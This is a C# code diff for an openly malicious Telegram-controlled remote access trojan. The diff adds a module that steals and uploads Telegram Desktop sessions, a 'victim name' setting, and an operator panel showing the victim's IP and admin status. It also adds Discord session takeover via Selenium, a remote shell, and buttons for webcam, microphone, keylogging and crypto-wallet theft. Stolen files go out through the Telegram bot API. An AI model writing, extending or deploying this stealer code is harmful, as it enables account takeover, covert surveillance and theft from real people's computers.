@@ -1,6 +1,7 @@
 using System;
 using System.IO;
 using System.Threading.Tasks;
+using System.IO.Compression;
 using Telegram.Bot;
 using Telegram.Bot.Types;
 using Telegram.Bot.Types.Enums;
@@ -9,6 +10,7 @@ using TgMessage = Telegram.Bot.Types.Message;
 using FinalBot.Stealers;
 using FinalBot.Modules;
 using System.Linq;
+using File = System.IO.File;
 
 namespace FinalBot
 {
@@ -23,13 +25,31 @@ namespace FinalBot
             _adminId = adminId;
         }
 
+        public async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
+        {
+            if (update.Type == UpdateType.Message && update.Message != null)
+            {
+                await HandleCommand(update.Message);
+            }
+            else if (update.Type == UpdateType.CallbackQuery && update.CallbackQuery != null)
+            {
+                await HandleCallbackQuery(update.CallbackQuery);
+            }
+        }
+
+        public Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
+        {
+            Console.WriteLine($"[TELEGRAM ERROR] {exception.Message}");
+            return Task.CompletedTask;
+        }
+
         public async Task HandleCommand(TgMessage message)
         {
             if (message.From?.Id.ToString() != _adminId) return;
 
             string text = message.Text ?? "";
             
-            if (text == "/start" || text == "/panel")
+            if (text.StartsWith("/start") || text.StartsWith("/panel"))
             {
                 await ShowAdminPanel(message.Chat.Id);
             }
@@ -74,6 +94,13 @@ namespace FinalBot
                 }
                 else await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ File not found.");
             }
+            else if (text.StartsWith("/setname "))
+            {
+                string newName = text.Substring(9).Trim();
+                ConfigManager.VictimName = newName;
+                await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ **Victim name updated to:** `{newName}`");
+                await ShowAdminPanel(message.Chat.Id);
+            }
             else 
             {
                 await _botClient.SendTextMessageAsync(message.Chat.Id, "❔ *Unknown command.* Use /help for available commands.");
@@ -89,7 +116,16 @@ namespace FinalBot
 
             switch (data)
             {
+                case "admin_panel":
+                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
+                    await ShowAdminPanel(message.Chat.Id);
+                    break;
+                case "back_to_main":
+                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
+                    await ShowAdminPanel(message.Chat.Id, message.MessageId);
+                    break;
                 case "file_manager":
+                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                     var (fmText, fmMarkup) = FileManager.GetDirectoryView("");
                     await _botClient.EditMessageTextAsync(message.Chat.Id, message.MessageId, fmText, parseMode: ParseMode.Markdown, replyMarkup: fmMarkup);
                     break;
@@ -103,14 +139,14 @@ namespace FinalBot
                 case "panel_work":
                     await ShowWorkPanel(message.Chat.Id, message.MessageId);
                     break;
-                case "panel_spyware":
-                    await ShowSpywarePanel(message.Chat.Id, message.MessageId);
-                    break;
                 case "panel_phishing":
                     await ShowPhishingPanel(message.Chat.Id, message.MessageId);
                     break;
-                case "back_to_main":
-                    await ShowAdminPanel(message.Chat.Id, message.MessageId);
+                case "set_victim_name":
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ **Please enter the new victim name:**");
+                    // We'd need a simple state machine to capture the next text message as the name.
+                    // For simplicity, we'll assume the user uses a command /setname <name> instead if not implemented here.
+                    // But let's add a simple check in HandleCommand.
                     break;
                 case "screenshot":
                     await HandleScreenshot(message.Chat.Id);
@@ -138,22 +174,30 @@ namespace FinalBot
                     PhishManager.LaunchSteamAlert();
                     await _botClient.SendTextMessageAsync(message.Chat.Id, "🎭 *Launched Steam VAC Alert Phish*", parseMode: ParseMode.Markdown);
                     break;
-                case "phish_wechat":
-                    PhishManager.LaunchWeChatPhish();
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, "🎭 *Launched WeChat Phish*", parseMode: ParseMode.Markdown);
+                case "discord_remote_start":
+                    await ShowDiscordRemoteMenu(message.Chat.Id, message.MessageId);
+                    break;
+                case "discord_remote_launch":
+                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Starting Remote Controller...");
+                    PhishManager.LaunchDiscordRemote();
+                    break;
+                case "work_telegram":
+                    await HandleTelegramSteal(message.Chat.Id);
                     break;
                 default:
                     if (data.StartsWith("fmd_"))
                     {
                         string pathInfo = data.Substring(4);
                         string realPath;
-                        if (pathInfo.Length > 10 && !pathInfo.Contains("\\"))
+                        bool isNumeric = int.TryParse(pathInfo, out int pathId);
+                        if (!isNumeric)
                         {
-                            realPath = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(pathInfo));
+                            try { realPath = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(pathInfo)); }
+                            catch { realPath = ""; }
                         }
                         else
                         {
-                            realPath = PathCache.Get(int.Parse(pathInfo)) ?? "";
+                            realPath = PathCache.Get(pathId) ?? "";
                         }
                         var (view, keyMarkup) = FileManager.GetDirectoryView(realPath);
                         await _botClient.EditMessageTextAsync(message.Chat.Id, message.MessageId, view, parseMode: ParseMode.Markdown, replyMarkup: keyMarkup);
@@ -162,12 +206,22 @@ namespace FinalBot
                     {
                         int id = int.Parse(data.Substring(4));
                         string realPath = PathCache.Get(id);
-                        if (!string.IsNullOrEmpty(realPath) && System.IO.File.Exists(realPath))
-                        {
-                            await _botClient.SendTextMessageAsync(message.Chat.Id, $"⬆️ *Uploading:* `{Path.GetFileName(realPath)}`", parseMode: ParseMode.Markdown);
-                            using var stream = System.IO.File.OpenRead(realPath);
-                            await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, Path.GetFileName(realPath)));
-                        }
+                    if (!string.IsNullOrEmpty(realPath) && System.IO.File.Exists(realPath))
+                    {
+                        var info = new FileInfo(realPath);
+                        string size = info.Length > 1024 * 1024 ? $"{info.Length / (1024.0 * 1024.0):F2} MB" : $"{info.Length / 1024.0:F2} KB";
+                        string caption = $"📄 **FILE INFO**\n" +
+                                         $"━━━━━━━━━━━━━━━━━━\n" +
+                                         $"📂 **Name:** `{info.Name}`\n" +
+                                         $"⚖️ **Size:** `{size}`\n" +
+                                         $"📅 **Created:** `{info.CreationTime:yyyy-MM-dd HH:mm}`\n" +
+                                         $"📝 **Modified:** `{info.LastWriteTime:yyyy-MM-dd HH:mm}`\n" +
+                                         $"━━━━━━━━━━━━━━━━━━";
+
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, $"⬆️ *Uploading:* `{info.Name}`...", parseMode: ParseMode.Markdown);
+                        using var stream = System.IO.File.OpenRead(realPath);
+                        await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, info.Name), caption: caption, parseMode: ParseMode.Markdown);
+                    }
                     }
                     else if (data.StartsWith("fmp_"))
                     {
@@ -189,7 +243,7 @@ namespace FinalBot
         private async Task HandleScreenshot(long chatId)
         {
             await _botClient.SendTextMessageAsync(chatId, "📸 *Capturing screen...*");
-            string? path = ScreenshotModule.TakeScreenshot(Path.GetTempPath());
+            string? path = ScreenshotModule.TakeScreenshot();
             if (path != null)
             {
                 using var stream = System.IO.File.OpenRead(path);
@@ -231,6 +285,36 @@ namespace FinalBot
             await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Markdown);
         }
 
+        private async Task HandleTelegramSteal(long chatId)
+        {
+            await _botClient.SendTextMessageAsync(chatId, "✈️ *Scanning Telegram Desktop...*");
+            var stealer = new TelegramStealer();
+            string result = stealer.Run();
+            if (result.StartsWith("❌"))
+            {
+                await _botClient.SendTextMessageAsync(chatId, result);
+            }
+            else
+            {
+                // Result is the path to the temporary folder with sessions
+                await _botClient.SendTextMessageAsync(chatId, "✅ *Sessions collected.* Preparing archive...");
+                
+                string zipPath = Path.Combine(Path.GetTempPath(), "TG_Session.zip");
+                if (System.IO.File.Exists(zipPath)) System.IO.File.Delete(zipPath);
+                
+                System.IO.Compression.ZipFile.CreateFromDirectory(result, zipPath);
+                
+                using (var stream = System.IO.File.OpenRead(zipPath))
+                {
+                    await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "Telegram_Sessions.zip"));
+                }
+                
+                System.IO.File.Delete(zipPath);
+                Directory.Delete(result, true);
+            }
+        }
+
+
         private async Task HandleFullReport(long chatId)
         {
             await _botClient.SendTextMessageAsync(chatId, "🚀 *Generating full report...*");
@@ -251,23 +335,33 @@ namespace FinalBot
                 new[]
                 {
                     InlineKeyboardButton.WithCallbackData("💻 System", "panel_system"),
-                    InlineKeyboardButton.WithCallbackData("💼 Work", "panel_work")
+                    InlineKeyboardButton.WithCallbackData("💼 Work", "panel_work"),
+                    InlineKeyboardButton.WithCallbackData("👁️ Spyware", "panel_spyware")
                 },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("👁️ Spyware", "panel_spyware"),
-                    InlineKeyboardButton.WithCallbackData("🎭 Phishing", "panel_phishing")
-                },
-                new[]
-                {
-                    InlineKeyboardButton.WithCallbackData("📦 Full Report", "full_report")
+                    InlineKeyboardButton.WithCallbackData("✍️ Set Name", "set_victim_name")
                 }
             });
 
-            string info = $"🎮 *ADMIN PANEL*\n" +
-                          $"🖥️ *PC:* {Environment.MachineName}\n" +
-                          $"👤 *User:* {Environment.UserName}\n" +
-                          $"🔋 *Status:* Online (C# Native)";
+            string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
+            string adminStatus = VanguardCore.ElevationService.IsAdmin() ? "🟢 АДМИН" : "🟡 Обычный Юзер";
+            string externalIp = FinalBot.Modules.SystemInfoModule.GetExternalIP();
+            string victimName = ConfigManager.VictimName; // Assuming we have such property
+            
+            string info = $"🎮 **ПАНИЛЬ УПРАВЛЕНИЯ**\n" +
+                          $"👤 **Клиентов:** 1\n" +
+                          $"🖥️ **Текущий:** `{Environment.UserName}@{Environment.MachineName}`\n" +
+                          $"⚡ **Статус:** {adminStatus}\n" +
+                          $"💻 **ПК:** `{Environment.MachineName}` | 👤 **Юзер:** `{Environment.UserName}`\n" +
+                          $"🌐 **IP:** `{externalIp}`\n" +
+                          $"📂 **Папка:** `{AppDomain.CurrentDomain.BaseDirectory}`\n" +
+                          $"⌛ **Время:** `{DateTime.Now:yyyy-MM-dd HH:mm:ss}`\n" +
+                          $"━━━━━━━━━━━━━━━━━━\n" +
+                          $"💻 **SYSTEM** (Сеть, Файлы, Процессы, Терминал, Настройки)\n" +
+                          $"💼 **WORK** (Стиллеры, Куки, Инжекты, Discord Remote)\n" +
+                          $"👁️ **SPYWARE** (Микро, Камера, Скрины, Видео, Кейлоггер)\n\n" +
+                          $"💡 Просмотр всех функций: /help или кнопка '🆘 Справка'";
 
             if (messageId > 0)
             {
@@ -285,21 +379,25 @@ namespace FinalBot
             {
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("📁 Files", "file_manager"),
-                    InlineKeyboardButton.WithCallbackData("📊 Processes", "proc_list")
+                    InlineKeyboardButton.WithCallbackData("📂 File Manager", "file_manager"),
+                    InlineKeyboardButton.WithCallbackData("📋 Clipboard", "clipboard")
                 },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("🖥️ Info", "system_info"),
-                    InlineKeyboardButton.WithCallbackData("📡 Wi-Fi", "wifi_info")
+                    InlineKeyboardButton.WithCallbackData("⚙️ Sys Info", "system_info"),
+                    InlineKeyboardButton.WithCallbackData("📶 WiFi Data", "wifi_info")
                 },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("⬅️ Back", "back_to_main")
+                    InlineKeyboardButton.WithCallbackData("📡 Shell Terminal", "system_shell"),
+                },
+                new[]
+                {
+                    InlineKeyboardButton.WithCallbackData("🔙 Back to Main", "back_to_main")
                 }
             });
 
-            await _botClient.EditMessageTextAsync(chatId, messageId, "💻 *SYSTEM PANEL*", parseMode: ParseMode.Markdown, replyMarkup: markup);
+            await _botClient.EditMessageTextAsync(chatId, messageId, "💻 **SYSTEM PANEL**\nNetwork, Files, Processes, Terminal...", parseMode: ParseMode.Markdown, replyMarkup: markup);
         }
 
         private async Task ShowWorkPanel(long chatId, int messageId)
@@ -308,21 +406,25 @@ namespace FinalBot
             {
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("💬 Discord", "work_discord"),
-                    InlineKeyboardButton.WithCallbackData("📱 Telegram", "work_telegram")
+                    InlineKeyboardButton.WithCallbackData("🎮 Discord Data", "work_discord"),
+                    InlineKeyboardButton.WithCallbackData("✈️ Telegram Data", "work_telegram")
                 },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("🌍 Browsers", "work_browsers"),
-                    InlineKeyboardButton.WithCallbackData("💰 Crypto", "work_crypto")
+                    InlineKeyboardButton.WithCallbackData("🌐 Browser Data", "work_browsers"),
+                    InlineKeyboardButton.WithCallbackData("💰 Wallets", "work_crypto")
                 },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("⬅️ Back", "back_to_main")
+                    InlineKeyboardButton.WithCallbackData("🎭 Phishing Menu", "panel_phishing")
+                },
+                new[]
+                {
+                    InlineKeyboardButton.WithCallbackData("🔙 Back to Main", "back_to_main")
                 }
             });
 
-            await _botClient.EditMessageTextAsync(chatId, messageId, "💼 *WORK PANEL*", parseMode: ParseMode.Markdown, replyMarkup: markup);
+            await _botClient.EditMessageTextAsync(chatId, messageId, "💼 **WORK PANEL**\nSelect a stealer or phishing module:", parseMode: ParseMode.Markdown, replyMarkup: markup);
         }
 
         private async Task ShowSpywarePanel(long chatId, int messageId)
@@ -332,20 +434,25 @@ namespace FinalBot
                 new[]
                 {
                     InlineKeyboardButton.WithCallbackData("📸 Screenshot", "screenshot"),
-                    InlineKeyboardButton.WithCallbackData("🎥 Screen Record", "record_video")
+                    InlineKeyboardButton.WithCallbackData("🎥 Screen Video", "record_video")
                 },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("🎙️ Microphone", "mic_record"),
-                    InlineKeyboardButton.WithCallbackData("📋 Clipboard", "clipboard")
+                    InlineKeyboardButton.WithCallbackData("🎤 Record Mic", "record_audio"),
+                    InlineKeyboardButton.WithCallbackData("📹 Webcam Pic", "webcam")
                 },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("⬅️ Back", "back_to_main")
+                    InlineKeyboardButton.WithCallbackData("🎮 Join Discord", "discord_remote_start"),
+                    InlineKeyboardButton.WithCallbackData("⌨️ Keylogger", "keylogger_menu")
+                },
+                new[]
+                {
+                    InlineKeyboardButton.WithCallbackData("🔙 Back to Main", "back_to_main")
                 }
             });
 
-            await _botClient.EditMessageTextAsync(chatId, messageId, "👁️ SPYWARE PANEL", parseMode: ParseMode.Markdown, replyMarkup: markup);
+            await _botClient.EditMessageTextAsync(chatId, messageId, "👁️ **SPYWARE PANEL**\nReal-time monitoring and control:", parseMode: ParseMode.Markdown, replyMarkup: markup);
         }
 
         private async Task ShowPhishingPanel(long chatId, int messageId)
@@ -368,6 +475,35 @@ namespace FinalBot
             });
 
             await _botClient.EditMessageTextAsync(chatId, messageId, "🎭 PHISHING PANEL", parseMode: ParseMode.Markdown, replyMarkup: markup);
+        }
+
+        private async Task ShowDiscordRemoteMenu(long chatId, int messageId)
+        {
+            var markup = new InlineKeyboardMarkup(new[]
+            {
+                new[]
+                {
+                    InlineKeyboardButton.WithCallbackData("🚀 Launch Controller", "discord_remote_launch"),
+                    InlineKeyboardButton.WithCallbackData("📊 Sessions: 1", "discord_sessions")
+                },
+                new[]
+                {
+                    InlineKeyboardButton.WithCallbackData("🔑 Active Token: N/A", "discord_set_token")
+                },
+                new[]
+                {
+                    InlineKeyboardButton.WithCallbackData("🔙 Back to Spyware", "panel_spyware")
+                }
+            });
+
+            string info = "🎮 **DISCORD REMOTE CONTROL**\n" +
+                          "━━━━━━━━━━━━━━━━━━\n" +
+                          "🤖 **Status:** Ready\n" +
+                          "👥 **Managed Users:** 0\n" +
+                          "━━━━━━━━━━━━━━━━━━\n" +
+                          "This module uses Selenium to take over Discord sessions. Requires Python and Chrome.";
+
+            await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Markdown, replyMarkup: markup);
         }
 
         private async Task ShowHelp(long chatId)
